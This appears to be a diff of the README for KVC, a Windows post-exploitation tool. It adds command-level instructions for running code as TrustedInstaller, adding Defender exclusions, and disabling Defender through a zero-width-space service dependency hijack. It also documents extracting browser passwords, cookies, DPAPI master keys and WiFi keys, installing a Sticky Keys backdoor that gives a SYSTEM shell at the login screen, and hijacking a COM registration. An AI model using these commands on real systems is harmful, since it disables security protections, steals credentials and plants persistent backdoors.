-| LSASS Dump (156MB) | ~3.2s | 180MB | 156MB |
-| Protection Modification | ~50ms | <1MB | None |
-| Browser Credential Extract | ~1.8s | 15MB | 8MB |
-| Sticky Keys Install | ~800ms | <1MB | 16KB |
+### TrustedInstaller Commands
 
-### System Impact
+  * **Run Command as TrustedInstaller:**
 
-KVC is designed for minimal system impact:
+    ```powershell
+    kvc.exe trusted <command> [arguments...]
+    ```
 
-- **No persistent files** (atomic cleanup)
-- **No registry persistence** (temporary service entries)
-- **Minimal kernel footprint** (driver unloaded immediately)
-- **No process hooks** (direct syscalls only)
-- **Clean exit handling** (Ctrl+C signal handler)
+    Executes the specified `<command>` with full TrustedInstaller privileges . Supports executable paths and arguments. Also resolves `.lnk` shortcut files to their target executables.
 
-## 🎓 Educational Value & Research Applications
+  * **Add Context Menu:**
 
-### Windows Internals Research
+    ```powershell
+    kvc.exe install-context
+    ```
 
-KVC serves as an excellent case study for:
+    Adds a "Run as TrustedInstaller" entry to the right-click context menu for `.exe` and `.lnk` files in Windows Explorer, allowing easy elevation for any application .
 
-- **Kernel structure analysis** and reverse engineering
-- **Process protection mechanisms** understanding
-- **Windows security architecture** comprehension  
-- **EDR/AV evasion techniques** development
-- **Privilege escalation methodologies** research
+**Examples:**
 
-### Academic Applications
+```powershell
+# Open an elevated command prompt as TrustedInstaller
+kvc.exe trusted cmd.exe
 
-#### Computer Science Curriculum
-- **Operating Systems**: Kernel-mode programming, process management
-- **Computer Security**: Access control, privilege escalation, defense evasion
-- **Reverse Engineering**: Binary analysis, API hooking, structure recovery
-- **Malware Analysis**: Advanced persistence, steganography, evasion
+# Add a Defender exclusion using PowerShell (executed as TrustedInstaller)
+kvc.exe trusted powershell -Command "Add-MpPreference -ExclusionPath C:\Tools"
 
-#### Security Research
-- **Red Team Operations**: Advanced post-exploitation techniques
-- **Blue Team Training**: Detection and response to sophisticated threats
-- **Vulnerability Research**: Windows kernel security boundary analysis
-- **Forensics Training**: Memory acquisition from protected processes
+# Run a specific application with TI privileges
+kvc.exe trusted "C:\Program Files\MyTool\tool.exe" --admin-mode
 
-### Responsible Disclosure
+# Run a command from a shortcut file as TrustedInstaller
+kvc.exe trusted "C:\Users\Admin\Desktop\My Shortcut.lnk"
+```
 
-KVC's techniques are documented for legitimate security research and education. The framework:
+-----
 
-- **Does not exploit vulnerabilities** (uses legitimate Windows mechanisms)
-- **Requires administrative privileges** (no privilege escalation exploits)
-- **Includes comprehensive cleanup** (atomic operations, no persistence)
-- **Focuses on education** (detailed documentation and explanation)
+## 10\. Windows Defender Exclusion Management
 
-## 🚀 Future Development Roadmap
+Windows Defender often interferes with security research tools. KVC allows managing Defender's exclusions using TrustedInstaller privileges, bypassing potential Tamper Protection restrictions.
 
-### Planned Enhancements
+### How it Works
 
-#### v1.1.0 - Enhanced Browser Support
-- Firefox credential extraction improvements
-- Safari for Windows support (if applicable)
-- Enhanced COM interface detection
-- Improved AES-GCM decryption performance
+KVC uses the `trusted` command execution capability internally to run PowerShell commands that interact with the Defender configuration cmdlets:
 
-#### v1.2.0 - Advanced Evasion
-- Hardware breakpoint detection evasion
-- Enhanced syscall obfuscation
-- AMSI bypass integration
-- ETW (Event Tracing for Windows) evasion
+  * `Add-MpPreference -ExclusionPath`, `-ExclusionProcess`, `-ExclusionExtension`, `-ExclusionIpAddress` 
+  * `Remove-MpPreference -ExclusionPath`, etc.
 
-#### v1.3.0 - Forensic Capabilities  
-- Live memory analysis tools
-- Network credential extraction
-- Active Directory ticket manipulation
-- Certificate store access
+Because these PowerShell commands are executed under the TrustedInstaller context obtained by KVC, they can modify Defender settings even if Tamper Protection attempts to block changes from standard Administrator accounts.
 
-#### v2.0.0 - Next-Generation Architecture
-- Hypervisor-based protection bypass
-- HVCI/VBS environment support
-- ARM64 architecture compatibility
-- Linux subsystem integration
+### Exclusion Types
 
-### Research Directions
+KVC supports managing four types of exclusions :
 
-#### Emerging Threats
-- **Windows 11 22H2+ changes** to protection mechanisms
-- **Azure VM security features** analysis and bypass
-- **Windows Sandbox escape** techniques
-- **WSL2 security boundary** research
+  * **Paths:** Exclude specific files or entire folders (e.g., `C:\Tools\mytool.exe`, `D:\ResearchData\`).
+  * **Processes:** Exclude by process name (e.g., `mytool.exe`, `cmd.exe`). KVC automatically extracts the filename if a full path is provided.
+  * **Extensions:** Exclude all files with a specific extension (e.g., `.log`, `.tmp`, `.exe`). KVC automatically adds the leading dot if missing.
+  * **IpAddresses:** Exclude specific IP addresses or CIDR ranges from network inspection (e.g., `192.168.1.100`, `10.0.0.0/24`).
 
-#### Advanced Persistence
-- **UEFI-level persistence** mechanisms
-- **SMM (System Management Mode)** exploitation
-- **TPM-based attestation** bypass
-- **Secure Boot circumvention** techniques
+### Exclusion Commands
 
-## 🤝 Contributing & Community
+  * **Add Exclusion:**
 
-### Contributing Guidelines
+    ```powershell
+    # Legacy Syntax (Adds current executable or specified path/process)
+    kvc.exe add-exclusion [path_or_process_name]
 
-We welcome contributions from the security research community:
+    # New Syntax (Specify Type)
+    kvc.exe add-exclusion Paths <file_or_folder_path>
+    kvc.exe add-exclusion Processes <process_name.exe>
+    kvc.exe add-exclusion Extensions <.ext>
+    kvc.exe add-exclusion IpAddresses <IP_or_CIDR>
+    ```
 
-#### Code Contributions
-1. **Fork the repository** and create feature branches
-2. **Follow coding standards** (modern C++17, RAII patterns)
-3. **Include comprehensive tests** for new functionality
-4. **Document new techniques** thoroughly
-5. **Submit pull requests** with detailed descriptions
+    Adds an exclusion to Windows Defender .
 
-#### Research Contributions  
-- **Windows version compatibility** testing
-- **New evasion techniques** development
-- **Performance optimizations** 
-- **Documentation improvements**
+      * If no arguments are given, it adds the KVC executable itself to both `Paths` and `Processes` exclusions.
+      * Legacy syntax without a type assumes `Paths` unless the argument looks like an executable name (ends in `.exe`), in which case it assumes `Processes`.
+      * New syntax requires specifying the type (`Paths`, `Processes`, `Extensions`, `IpAddresses`).
 
-### Community Resources
+  * **Remove Exclusion:**
 
-#### Official Channels
-- **Website**: [kvc.pl](https://kvc.pl)
-- **Email**: [marek@wesolowski.eu.org](mailto:marek@wesolowski.eu.org)  
-- **Phone**: [+48 607-440-283](tel:+48607440283)
+    ```powershell
+    # Legacy Syntax (Removes current executable or specified path/process)
+    kvc.exe remove-exclusion [path_or_process_name]
 
-#### Research Publications
-- Academic papers on Windows security mechanisms
-- Conference presentations on advanced evasion techniques
-- Detailed technical blog posts on implementation specifics
+    # New Syntax (Specify Type)
+    kvc.exe remove-exclusion Paths <file_or_folder_path>
+    kvc.exe remove-exclusion Processes <process_name.exe>
+    kvc.exe remove-exclusion Extensions <.ext>
+    kvc.exe remove-exclusion IpAddresses <IP_or_CIDR>
+    ```
 
-## ⚖️ Legal & Ethical Considerations
+    Removes a previously added exclusion . Syntax mirrors the `add-exclusion` command.
 
-### Intended Use Cases
+**Examples:**
 
-KVC is designed exclusively for legitimate purposes:
+```powershell
+# Exclude the KVC executable itself
+kvc.exe add-exclusion
 
-#### Authorized Activities
-- **Penetration testing** on owned or authorized systems
-- **Security research** in controlled environments  
-- **Educational training** for cybersecurity professionals
-- **Incident response** and forensic analysis
-- **Red team exercises** with proper authorization
+# Exclude a specific tool
+kvc.exe add-exclusion C:\Tools\research_tool.exe
 
-#### Prohibited Activities  
-- **Unauthorized access** to systems not owned or authorized
-- **Malicious credential theft** from production systems
-- **Circumventing security controls** without permission
-- **Distribution of stolen credentials** or sensitive data
+# Exclude an entire folder
+kvc.exe add-exclusion Paths D:\TempData
 
-### Legal Compliance
+# Exclude cmd.exe by process name
+kvc.exe add-exclusion Processes cmd.exe
 
-Users must ensure compliance with applicable laws:
+# Exclude all .tmp files
+kvc.exe add-exclusion Extensions .tmp
 
-#### International Considerations
-- **CFAA (Computer Fraud and Abuse Act)** in the United States
-- **GDPR (General Data Protection Regulation)** in European Union
-- **Local cybersecurity laws** in respective jurisdictions
-- **Corporate security policies** and agreements
+# Exclude a specific IP
+kvc.exe add-exclusion IpAddresses 192.168.0.50
 
-#### Best Practices
-- **Obtain written authorization** before use
-- **Document all activities** for compliance purposes
-- **Limit scope** to authorized targets only
-- **Protect extracted data** according to data protection laws
-- **Report findings** through appropriate channels
+# Remove the cmd.exe exclusion
+kvc.exe remove-exclusion Processes cmd.exe
+```
 
-## 📞 Support & Contact Information
+**Note:** Changes might take a moment to be reflected in the Windows Security interface. These operations require KVC to successfully obtain TrustedInstaller privileges. If Defender is completely disabled or not installed, the commands might report success without actually doing anything.
 
-### Technical Support
 
-For technical questions and support:
+-----
 
-#### Primary Contact
-- **Author**: Marek Wesołowski (WESMAR)
-- **Email**: [marek@wesolowski.eu.org](mailto:marek@wesolowski.eu.org)
-- **Phone**: [+48 607-440-283](tel:+48607440283)
-- **Website**: [kvc.pl](https://kvc.pl)
+## 11\. Security Engine Management (Windows Defender)
 
-#### Support Channels
-- **Technical Issues**: Detailed bug reports with system information
-- **Feature Requests**: Enhancement proposals with use case descriptions
-- **Research Collaboration**: Academic and industry partnership opportunities
-- **Training Inquiries**: Corporate training and workshop availability
+Beyond managing exclusions, KVC offers a powerful, albeit drastic, method to completely disable or enable the core Windows Defender Antivirus engine (`WinDefend` service). This technique bypasses standard user interfaces and Tamper Protection by manipulating service dependencies directly in the registry, requiring a system restart to take effect.
+
+### How it Works: The RpcSs Dependency Hijack
+
+Windows services often depend on other services to function correctly. The `WinDefend` service normally depends on the Remote Procedure Call service, listed in its registry configuration as `RpcSs`. KVC exploits this dependency:
+
+  * **To Disable:** KVC modifies the `WinDefend` service's `DependOnService` registry value, changing the dependency from `RpcSs` to `RpcSs<U+200B>` (using a Zero Width Space character). When Windows tries to start `WinDefend` on the next boot, it cannot find the non-existent `RpcSs<U+200B>` service, causing `WinDefend` to fail to start, effectively disabling it.
+  * **To Enable:** KVC changes the dependency back from `RpcSs<U+200B>` to the correct `RpcSs`. On the next boot, the dependency is met, and `WinDefend` starts normally.
+
+This registry modification requires TrustedInstaller privileges. KVC automates this using a snapshot-modify-restore technique on the `HKLM\SYSTEM\CurrentControlSet\Services` registry hive to ensure atomicity and handle potential locking issues .
+
+```mermaid
+graph TD
+    subgraph KVC Operation (Run as TI)
+        A[Backup HKLM\SYSTEM\...\Services Hive to Temp File] --> B[Load Temp Hive under HKLM\Temp];
+        B --> C{Modify WinDefend's DependOnService in HKLM\Temp};
+        C -- Disable --> D["Set RpcSs -> RpcSs<U+200B>"];
+        C -- Enable --> E["Set RpcSs<U+200B> -> RpcSs"];
+        D --> F[Unload HKLM\Temp];
+        E --> F;
+        F --> G[Restore Modified Hive to Live Services Key (REG_FORCE_RESTORE)];
+    end
+    subgraph Next System Boot
+        H[Windows Service Manager reads WinDefend Config] --> I{Check Dependencies};
+        I -- Dependency: RpcSs<U+200B> --> J[Service Not Found!];
+        J --> K[WinDefend Fails to Start (DISABLED)];
+        I -- Dependency: RpcSs --> L[RpcSs Service Found];
+        L --> M[WinDefend Starts Normally (ENABLED)];
+    end
+    G --> H;
+
+```
+
+**Crucially, a system restart is required** for these changes to take effect, as the service dependencies are evaluated during the boot process.
+
+### Security Engine Commands
+
+  * **Check Status:**
+
+    ```powershell
+    kvc.exe secengine status
+    ```
+
+    Queries the current `DependOnService` value for the `WinDefend` service in the registry to determine if the engine is configured to be enabled (`RpcSs`) or disabled (`RpcSs<U+200B>`) upon the next reboot . Provides a user-friendly status report .
+
+  * **Disable Security Engine:**
+
+    ```powershell
+    kvc.exe secengine disable [--restart]
+    ```
+
+    Modifies the registry to disable the `WinDefend` service on the next boot by changing its dependency to `RpcSs<U+200B>`. Requires Administrator privileges (internally uses TrustedInstaller).
+
+      * `--restart`: Immediately initiates a system restart after successfully modifying the registry.
+
+  * **Enable Security Engine:**
+
+    ```powershell
+    kvc.exe secengine enable [--restart]
+    ```
+
+    Modifies the registry to re-enable the `WinDefend` service on the next boot by restoring its dependency to `RpcSs`. Requires Administrator privileges.
+
+      * `--restart`: Immediately initiates a system restart after successfully modifying the registry.
+
+**Warning:** Disabling the core security engine significantly reduces system protection. Use this feature responsibly and only in controlled research environments. Remember that a **reboot is always required** for the change to become effective.
+
+-----
+
+## 12\. Browser Credential Extraction
+
+Modern web browsers store sensitive user data, including saved passwords, cookies, and autofill information. Accessing this data is challenging due to encryption (AES-GCM), integration with Windows Data Protection API (DPAPI), and file locking mechanisms. KVC provides methods to overcome these hurdles, primarily through its auxiliary tool `kvc_pass.exe`.
+
+### Challenges in Credential Extraction
+
+  * **Encryption:** Passwords are encrypted using AES-GCM. The encryption key is derived from a master key specific to the browser installation or user profile.
+  * **Master Key Protection:** The master key itself is encrypted using Windows DPAPI, tying it to the user's login credentials or the machine context. Decrypting it requires specific system privileges and access to LSA secrets.
+  * **File Locking:** Browser databases (like `Login Data`) are often locked while the browser is running, preventing direct access.
+
+### KVC Extraction Strategies
+
+KVC utilizes two main approaches:
+
+1.  **COM Hijacking via `kvc_pass.exe` (Chrome, Edge, Brave - Recommended):**
+
+      * `kvc.exe` determines the location of `kvc_pass.exe` (either in the current directory or System32) .
+      * `kvc.exe` launches `kvc_pass.exe` with appropriate arguments (browser type, output path) .
+      * `kvc_pass.exe` (whose internal implementation relies on injecting `BrowseCrypt.dll`) uses a technique likely involving COM hijacking. It leverages the browser's *own* internal mechanisms, potentially involving its elevation service (like Chrome's `IOriginalBaseElevator`), to request the decryption of the DPAPI-protected master key. This bypasses the need for KVC itself to directly handle DPAPI decryption for the browser master key.
+      * Once the plaintext AES-GCM master key is obtained, `kvc_pass.exe` copies the locked browser databases (e.g., `Login Data`, `Cookies`) to a temporary location, opens them using an embedded SQLite library, reads the encrypted password blobs, decrypts them using the master key, and saves the results (passwords, cookies, etc.) to JSON, HTML, and TXT reports in the specified output path.
+      * This method provides the most comprehensive extraction (passwords, cookies, autofill).
+
+2.  **Built-in DPAPI Decryption (Edge Fallback, WiFi):**
+
+      * When `kvc_pass.exe` is unavailable *or* specifically for extracting WiFi keys, `kvc.exe` uses its `TrustedInstallerIntegrator` to gain `SYSTEM` privileges and access the necessary DPAPI system secrets (like `DPAPI_SYSTEM`, `NL$KM` keys) stored in the protected `HKLM\SECURITY` registry hive .
+      * It exports these secrets using `reg export` under the TrustedInstaller context  and parses the `.reg` file .
+      * For Edge (fallback only): KVC reads Edge's `Local State` file to get the *browser's* DPAPI-encrypted master key . It then uses `CryptUnprotectData` (leveraging the previously obtained system secrets if needed) to decrypt this browser master key . Finally, it copies the Edge `Login Data` database, queries it using its built-in SQLite functions , reads the encrypted password blobs (prefixed with "v10" for modern Chrome/Edge), and decrypts them using AES-GCM with the decrypted browser master key .
+      * This built-in method primarily focuses on passwords and generates HTML/TXT reports but is less comprehensive than the `kvc_pass.exe` approach.
+
+### Browser Password Commands
+
+  * **Extract Browser Passwords:**
+    ```powershell
+    kvc.exe browser-passwords [browser_flags...] [output_options...]
+    kvc.exe bp [browser_flags...] [output_options...] # Alias
+    ```
+    Extracts credentials from specified browsers . Requires `kvc_pass.exe` for Chrome, Brave, and the `--all` flag, or for full Edge extraction (including cookies/JSON). If `kvc_pass.exe` is absent, the command *only* works for Edge (`--edge`) using the built-in DPAPI fallback method.
+      * `--chrome`: Target Google Chrome (requires `kvc_pass.exe`). Default if no browser flag is specified.
+      * `--edge`: Target Microsoft Edge. Uses `kvc_pass.exe` if available for full extraction, otherwise uses built-in DPAPI fallback .
+      * `--brave`: Target Brave Browser (requires `kvc_pass.exe`).
+      * `--all`: Target all supported browsers (requires `kvc_pass.exe`) .
+      * `--output <path>` or `-o <path>`: Specify the directory to save report files (HTML, TXT, JSON). Defaults to the current directory.
+
+**Examples:**
+
+```powershell
+# Extract Chrome passwords (requires kvc_pass.exe) to current dir
+kvc.exe bp
+
+# Extract Edge passwords (uses kvc_pass if present, else DPAPI fallback) to C:\reports
+kvc.exe bp --edge --output C:\reports
+
+# Extract all browser passwords (requires kvc_pass.exe) to Downloads
+kvc.exe bp --all -o "%USERPROFILE%\Downloads"
+```
+
+-----
+
+## 13\. DPAPI Secrets Extraction (WiFi, Master Keys)
+
+Beyond browser-specific data, KVC can extract other system secrets protected by DPAPI, including saved WiFi network keys and the DPAPI master keys themselves. This process relies heavily on TrustedInstaller privileges.
+
+### How it Works
+
+The `export secrets` command orchestrates several steps:
+
+1.  **Acquire TrustedInstaller:** Gains elevated privileges necessary to access protected registry keys and run system commands .
+2.  **Extract LSA Secrets (DPAPI Master Keys):**
+      * Uses the TrustedInstaller context to execute `reg export` commands targeting the protected keys under `HKLM\SECURITY\Policy\Secrets`, specifically `DPAPI_SYSTEM`, `NL$KM`, and potentially others . These keys are crucial for machine-level DPAPI decryption.
+      * Exports are saved to temporary `.reg` files in the system temp directory.
+      * KVC parses these `.reg` files to extract the raw, encrypted key data .
+      * It attempts to decrypt these keys using `CryptUnprotectData` for display and potential later use, storing both raw and decrypted versions .
+3.  **Extract WiFi Credentials:**
+      * Executes the `netsh wlan show profiles` command to list saved WiFi network names (SSIDs) .
+      * For each profile, executes `netsh wlan show profile name="<SSID>" key=clear` to retrieve the plaintext password .
+      * Parses the command output to extract the SSID and password .
+4.  **Extract Browser Passwords (Edge DPAPI Method):** Performs the built-in Edge password extraction described in Section 12 as part of this broader secret export. *(Note: It relies on the previously extracted master keys if needed)*.
+5.  **Generate Reports:** Consolidates all extracted master keys, WiFi passwords, and Edge passwords into comprehensive HTML and TXT reports saved to the specified output directory .
+6.  **Cleanup:** Removes temporary files .
+
+### DPAPI Secrets Command
+
+  * **Export DPAPI Secrets:**
+    ```powershell
+    kvc.exe export secrets [output_path]
+    ```
+    Performs the full DPAPI secret extraction process described above . Requires Administrator privileges (uses TrustedInstaller internally).
+      * `[output_path]`: Optional directory to save the HTML and TXT report files. Defaults to a timestamped folder within the user's `Downloads` directory (e.g., `Downloads\Secrets_DD.MM.YYYY`).
+
+**Example:**
+
+```powershell
+# Export secrets to the default Downloads\Secrets_... folder
+kvc.exe export secrets
+
+# Export secrets to a custom directory C:\kvc_secrets
+kvc.exe export secrets C:\kvc_secrets
+```
+
+The generated reports provide a summary and detailed tables for the extracted DPAPI master keys (raw and processed hex), WiFi credentials (SSID and password), and any Edge passwords found via the DPAPI method .
+
+-----
+
+## 14\. Sticky Keys Backdoor
+
+KVC includes functionality to install a persistent backdoor using the "Sticky Keys" accessibility feature (`sethc.exe`). This technique leverages Image File Execution Options (IFEO) in the registry to replace the execution of `sethc.exe` with a command prompt (`cmd.exe`), granting SYSTEM-level privileges from the Windows login screen without needing to log in.
+
+### How it Works: IFEO Hijacking
+
+1.  **IFEO Registry Key:** Windows allows developers to specify a "debugger" for an executable via the registry under `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable_name.exe>`. When the OS attempts to launch the executable, it launches the specified debugger instead, passing the original executable's path as an argument.
+2.  **Hijacking `sethc.exe`:** KVC creates the key `...\Image File Execution Options\sethc.exe` and sets the `Debugger` value to `cmd.exe`.
+3.  **Triggering:** The Sticky Keys feature is typically invoked by pressing the Shift key five times rapidly. When triggered from the login screen (or lock screen), the OS tries to launch `sethc.exe` under the `SYSTEM` account.
+4.  **Redirection:** Due to the IFEO registry key, the OS launches `cmd.exe` instead of `sethc.exe`, inheriting the `SYSTEM` privileges.
+5.  **Defender Evasion:** To prevent Windows Defender from detecting the potentially malicious launch of `cmd.exe` in this context, KVC proactively adds `cmd.exe` to the Defender process exclusions list using TrustedInstaller privileges *before* setting the IFEO key.
+
+<!-- end list -->
+
+```mermaid
+graph TD
+    A[User presses Shift 5x at Login Screen] --> B{Windows OS};
+    B --> C{Attempt to launch sethc.exe (as SYSTEM)};
+    C --> D{Check IFEO Registry Key for sethc.exe};
+    D -- Debugger value exists? --> E{Debugger = "cmd.exe"};
+    E --> F[Launch cmd.exe instead (as SYSTEM)];
+    F --> G[SYSTEM-level Command Prompt Appears];
+    D -- Debugger value absent? --> H[Launch sethc.exe normally];
+```
+
+### Sticky Keys Commands
+
+  * **Install Backdoor:**
+
+    ```powershell
+    kvc.exe shift
+    ```
+
+    Creates the necessary IFEO registry key for `sethc.exe`, sets the `Debugger` value to `cmd.exe`, and adds `cmd.exe` to Windows Defender process exclusions. Requires Administrator privileges (uses TrustedInstaller internally) .
+
+  * **Remove Backdoor:**
+
+    ```powershell
+    kvc.exe unshift
+    ```
+
+    Deletes the `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe` registry key and attempts to remove the `cmd.exe` process exclusion from Windows Defender . Requires Administrator privileges.
+
+**Usage:** After running `kvc shift`, go to the Windows login or lock screen and press the Left Shift key five times consecutively. A command prompt window running with `NT AUTHORITY\SYSTEM` privileges should appear. Use `kvc unshift` to remove the backdoor and clean up the associated registry key and Defender exclusion.
+
+-----
+
+## 15\. Desktop Watermark Management
+
+Windows sometimes displays desktop watermarks (e.g., "Evaluation copy," "Test Mode"). KVC provides a method to remove or restore these watermarks by hijacking a specific COM component registration used by the Windows shell (`explorer.exe`).
+
+### How it Works: CLSID Hijacking via ExplorerFrame DLL
+
+1.  **Target Component:** The Windows shell uses various COM components for its functionality. KVC targets a specific CLSID (Class Identifier) `{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}` related to shell frame rendering. The default implementation is located in `ExplorerFrame.dll`.
+2.  **Registry Hijack:** The registration for this CLSID is stored under `HKEY_CLASSES_ROOT\CLSID\{ab0b37ec-56f6-4a0e-a8fd-7a8bf7c2da96}\InProcServer32`. The default value points to the path of the implementing DLL (`%SystemRoot%\system32\ExplorerFrame.dll`).
+3.  **Modified DLL:** KVC contains an embedded, modified version of a DLL (likely derived from `ExplorerFrame.dll` or a similar shell component) designed *not* to render the watermark. This modified DLL is named `ExplorerFrame<U+200B>.dll`, incorporating a Zero Width Space character (U+200B) in its name. This naming trick helps bypass potential System File Protection mechanisms that might otherwise prevent overwriting or placing similarly named files in `System32`.
+4.  **Extraction and Deployment:**
+      * `kvc.exe` extracts this modified DLL from its resources. This involves the same steganographic process used for the driver: loading the icon resource, skipping the icon header, XOR-decrypting the embedded CAB archive, decompressing the CAB, and splitting the resulting `kvc.evtx` file into `kvc.sys` and `ExplorerFrame<U+200B>.dll` .
+      * Using TrustedInstaller privileges, KVC writes the extracted `ExplorerFrame<U+200B>.dll` to the `C:\Windows\System32` directory.
+5.  **Registry Modification:** KVC uses TrustedInstaller privileges to change the default value under the target CLSID's `InProcServer32` key from the original `ExplorerFrame.dll` path to the path of the modified DLL: `%SystemRoot%\system32\ExplorerFrame<U+200B>.dll`.
+6.  **Applying Changes:** KVC forcefully terminates all running `explorer.exe` processes and immediately restarts `explorer.exe` . The newly started Explorer process reads the modified registry key and loads the hijacked `ExplorerFrame<U+200B>.dll` instead of the original, resulting in the watermark no longer being displayed.
+7.  **Restoration:** The `restore` command reverses the process: it sets the registry value back to the original `ExplorerFrame.dll` path , restarts `explorer.exe` to unload the hijacked DLL , and then deletes the `ExplorerFrame<U+200B>.dll` file from `System32` using TrustedInstaller .
+
+<!-- end list -->
+
+```mermaid
+graph TD
+    subgraph Remove Watermark
+        A[kvc watermark remove] --> B{Extract ExplorerFrame<U+200B>.dll};
+        B --> C[Write DLL to System32 (as TI)];
+        C --> D[Modify HKCR\CLSID\{...}\InProcServer32 Default Value -> Hijacked DLL (as TI)];
+        D --> E[Restart explorer.exe];
+        E --> F[Explorer loads Hijacked DLL -> Watermark GONE];
+    end
+    subgraph Restore Watermark
+        G[kvc watermark restore] --> H[Modify HKCR\CLSID\{...}\InProcServer32 Default Value -> Original DLL (as TI)];
+        H --> I[Restart explorer.exe];
+        I --> J[Explorer loads Original DLL -> Watermark VISIBLE];
+        I --> K[Delete Hijacked DLL from System32 (as TI)];
+    end
+```
+
+### Watermark Management Commands
+
+  * **Remove Watermark:**
+
+    ```powershell
+    kvc.exe watermark remove
+    kvc.exe wm remove # Alias
+    ```
+
+    Deploys the modified DLL, hijacks the registry entry, and restarts Explorer to remove the desktop watermark.
+
+  * **Restore Watermark:**
+
+    ```powershell
+    kvc.exe watermark restore
+    kvc.exe wm restore # Alias
+    ```
+
+    Restores the original registry entry, restarts Explorer, and deletes the modified DLL to bring back the default watermark.
+
+  * **Check Status:**
+
+    ```powershell
+    kvc.exe watermark status
+    kvc.exe wm status # Alias
+    ```
+
+    Reads the relevant registry key to determine if the watermark is currently configured as "REMOVED" (hijacked), "ACTIVE" (original), or "UNKNOWN" (unexpected value) .
+
+-----
+
+## 16\. System Registry Management
+
+KVC provides robust tools for backing up, restoring, and defragmenting critical Windows registry hives. These operations leverage TrustedInstaller privileges for unrestricted access to hives that are normally locked by the operating system.
+
+### Capabilities
+
+  * **Backup:** Creates copies of essential system and user registry hives, including `SAM`, `SECURITY`, `SOFTWARE`, `SYSTEM`, `DEFAULT`, `BCD`, `NTUSER.DAT`, and `UsrClass.dat`.
+  * **Restore:** Replaces live registry hives with files from a backup. This is a destructive operation requiring a system restart.
+  * **Defragment:** Reduces the physical size and fragmentation of registry hive files by exporting (saving) them using `REG_LATEST_FORMAT`, which implicitly compacts the data, and then scheduling a restore of these compacted hives.
+
+### How it Works
+
+1.  **Privilege Elevation:** All registry operations begin by acquiring a TrustedInstaller token to bypass standard permissions and file locks .
+2.  **Backup (`kvc registry backup [path]`):**
+      * KVC iterates through a predefined list of critical hives (`SYSTEM`, `SOFTWARE`, `SAM`, `SECURITY`, `DEFAULT`, `BCD`, user `NTUSER.DAT`, user `UsrClass.dat`) .
+      * For each hive, it opens the corresponding registry key (e.g., `HKLM\SYSTEM`) with backup privileges.
+      * It calls the `RegSaveKeyExW` API with the `REG_LATEST_FORMAT` flag. This API saves the live hive data directly to a file (e.g., `SYSTEM`), automatically handling locked keys and compacting the data during the save process.
+      * Files are saved to the specified output directory or a timestamped folder in `Downloads` .
+3.  **Restore (`kvc registry restore <path>`):**
+      * **Validation:** KVC first checks if all expected hive files exist in the specified source directory .
+      * **User Confirmation:** Prompts the user to confirm the destructive restore operation and subsequent reboot.
+      * **Applying Restore:**
+          * KVC enables `SeRestorePrivilege` and `SeBackupPrivilege` .
+          * It iterates through the restorable hives (`BCD` is typically skipped ).
+          * For each hive, it opens the target registry key (e.g., `HKLM\SYSTEM`) with write access.
+          * It attempts a "live" restore using `RegRestoreKeyW` with the `REG_FORCE_RESTORE` flag. This attempts to replace the in-memory hive immediately.
+          * **If live restore fails** (often due to the hive being actively used), KVC identifies the physical hive file on disk (e.g., `C:\Windows\System32\config\SYSTEM`)  and uses the `MoveFileExW` API with the `MOVEFILE_DELAY_UNTIL_REBOOT | MOVEFILE_REPLACE_EXISTING` flags. This schedules the operating system to replace the hive file with the backup file during the *next* system startup, before the hive is loaded.
+      * **Forced Reboot:** After attempting to restore all hives (either live or scheduled), KVC initiates an immediate system reboot using `InitiateSystemShutdownExW` to apply the changes .
+4.  **Defragment (`kvc registry defrag [path]`):**
+      * Performs a full registry backup (as described above) to a temporary or specified path . The use of `RegSaveKeyExW` with `REG_LATEST_FORMAT` inherently creates compacted (defragmented) hive files.
+      * Prompts the user to confirm if they want to immediately restore these newly created, compacted hives.
+      * If confirmed, it proceeds with the restore process (including the forced reboot) using the temporary backup path as the source.
+
+### Registry Management Commands
+
+  * **Backup Registry:**
+
+    ```powershell
+    kvc.exe registry backup [output_path]
+    ```
+
+    Backs up critical system and current user registry hives .
+
+      * `[output_path]`: Optional directory to save the hive files. Defaults to `Downloads\Registry_Backup_<timestamp>`.
+
+  * **Restore Registry:**
+
+    ```powershell
+    kvc.exe registry restore <source_path>
+    ```
+
+    Restores registry hives from a previous backup located in `<source_path>`. **Requires user confirmation and forces an immediate system reboot** . Use with extreme caution.
+
+  * **Defragment Registry:**
+
+    ```powershell
+    kvc.exe registry defrag [temp_backup_path]
+    ```
+
+    Performs a backup using compaction (`RegSaveKeyExW`) to `<temp_backup_path>` (defaults to a temporary folder) . Then prompts the user to optionally restore these compacted hives, which requires a reboot .
+
+**Warning:** Registry restore operations are inherently risky and can render a system unbootable if the backup is corrupted or incompatible. Always ensure you have a reliable system backup before attempting a restore.
+
+-----
+
+## 17\. KVC Service Management
+
+KVC can be installed as a persistent Windows service (`KernelVulnerabilityControl`) that starts automatically with the system. While the core functionalities like DSE control, dumping, and protection manipulation rely on *temporary* driver loading via atomic operations, the service mode provides a persistent background presence, potentially for future features or scenarios requiring continuous operation (though current implementation primarily uses it for optional background hooks like the unimplemented 5x LCtrl).
+
+### Service Features
+
+  * **Installation:** Installs as a standard Win32 service running under the `LocalSystem` account.
+  * **Auto-Start:** Configured to start automatically when Windows boots.
+  * **Self-Protection:** Attempts to protect itself with `PP-WinTcb` upon starting .
+  * **Resource Initialization:** When the service starts, it initializes core components like the `Controller`  and potentially background hooks  (though the 5x LCtrl hook is noted as unimplemented/optional in source ).
+  * **Lifecycle Management:** Can be started, stopped, and restarted using standard service control commands or KVC's own commands.
+
+### How Service Mode Works
+
+  * **Installation (`kvc install`):** Uses the Windows Service Control Manager (SCM) API (`OpenSCManager`, `CreateService`) to register `kvc.exe` as a service. The executable path is configured with the `--service` command-line argument, telling `kvc.exe` to run in service mode when launched by the SCM .
+  * **Service Execution (`kvc.exe --service`):**
+      * When launched by the SCM, `kvc.exe` detects the `--service` argument.
+      * It calls `StartServiceCtrlDispatcher` to connect to the SCM.
+      * The `ServiceMain` function is called by the SCM. It registers the `ServiceCtrlHandler` callback , initializes status , creates a stop event , initializes components (Controller, hooks) , starts a background worker thread , and sets the status to `SERVICE_RUNNING`.
+      * The `ServiceWorkerThread` runs in a loop, waiting for the stop event or performing periodic tasks (currently just a heartbeat) .
+      * The `ServiceCtrlHandler` responds to SCM commands like `SERVICE_CONTROL_STOP` by setting the stop event and updating the service status.
